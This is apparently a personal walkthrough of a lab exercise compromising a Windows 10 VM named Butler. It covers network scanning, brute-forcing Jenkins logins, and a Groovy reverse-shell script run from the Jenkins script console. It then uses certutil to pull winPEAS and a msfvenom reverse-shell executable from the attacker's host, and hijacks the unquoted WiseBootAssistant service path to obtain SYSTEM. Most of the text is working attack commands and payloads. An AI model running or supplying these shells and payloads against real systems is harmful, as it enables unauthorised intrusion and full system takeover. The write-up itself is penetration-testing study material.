
```python
export TARGET_IP=192.168.254.137
export TARGET_MAC=00:0c:29:89:7d:a5
export TARGET_NETWORK=192.168.254.0/24
```

scanning
```python
sudo arp-scan -l  
```
192.168.254.137	00:0c:29:89:7d:a5	VMware, Inc.


nmap port disco
```python
sudo nmap -T4 -A -p- $TARGET_IP
```
PORT     STATE SERVICE
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5040/tcp  open  unknown
7680/tcp  open  pando-pub
8080/tcp  open  http-proxy
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown



Deep nmap on ports
```python
sudo nmap -A -T4 -p 135,139,445,8080,49664,49665,49666,49667,49668,49669,5040,7680 -v $TARGET_IP
```

```output
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
8080/tcp open  http          Jetty 9.4.41.v20210516
|_http-favicon: Unknown favicon MD5: 23E8C7BD78E8CD826C5A6073B15068B1
|_http-server-header: Jetty(9.4.41.v20210516)
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
| http-robots.txt: 1 disallowed entry 
|_/
MAC Address: 00:0C:29:89:7D:A5 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Microsoft Windows 10
OS CPE: cpe:/o:microsoft:windows_10
OS details: Microsoft Windows 10 1709 - 1909
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=265 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-11-11T09:25:32
|_  start_date: N/A
| nbstat: NetBIOS name: BUTLER, NetBIOS user: <unknown>, NetBIOS MAC: 00:0c:29:89:7d:a5 (VMware)
| Names:
|   BUTLER<20>           Flags: <unique><active>
|   BUTLER<00>           Flags: <unique><active>
|_  WORKGROUP<00>        Flags: <group><active>
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: 2h59m59s

TRACEROUTE
HOP RTT     ADDRESS
1   0.21 ms 192.168.254.137

```

Enum hostname
```python
nmblookup -A 192.168.254.137
```
```output
Looking up status of 192.168.254.137
	BUTLER          <20> -         M <ACTIVE> 
	BUTLER          <00> -         M <ACTIVE> 
	WORKGROUP       <00> - <GROUP> M <ACTIVE> 

	MAC Address = 00-0C-29-89-7D-A5
```

```python
burpesuite
```

Used intruder with usernames and passwords that are common 

jenkins:jenkins
worked
logged in
went to Groovy script console
used but wait to hit run until listener is up

https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76
```python
String host="192.168.254.132";
int port=1234;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```


```python
nc -lvnp 1234
```

hit run on  groovy

now i have a shell   

on my kali with winpeas
```python
python3 -m http.server
```

cd to \Temp

pull down winPEAS from my python server
```powershell
certutil -urlcache -split -f "http://192.168.254.132:8000/winPEASx86.exe" winPEASx86.exe
```

run it
```python
.\winPEASx86.exe
```

```output
 WiseBootAssistant(WiseCleaner.com - Wise Boot Assistant)[C:\Program Files (x86)\Wise\Wise Care 365\BootTime.exe] - Auto - Running - No quotes and Space detected                                                    
    YOU CAN MODIFY THIS SERVICE: AllAccess
    File Permissions: Administrators [AllAccess]
    Possible DLL Hijacking in binary folder: C:\Program Files (x86)\Wise\Wise Care 365 (Administrators [AllAccess])                                                                                                     
    In order to optimize system performance,Wise Care 365 will calculate your system startup time.

```

```python
msfvenom -p windows/x64/shell_reverse_tcp -f exe LHOST=192.168.254.132 LPORT=7777 > wise.exe   
```

```python
python3 -m http.server
```

```python
cd "C:\Program Files (x86)\Wise"
```

```python
certutil -urlcache -split -f "http://192.168.254.132:8000/wise.exe" Wise.exe
```

```python
nc -lvnp 7777
```

restart process to execute shell code
```python
sc stop WiseBootAssistant
```

```python
sc start WiseBootAssistant
```

boot System!
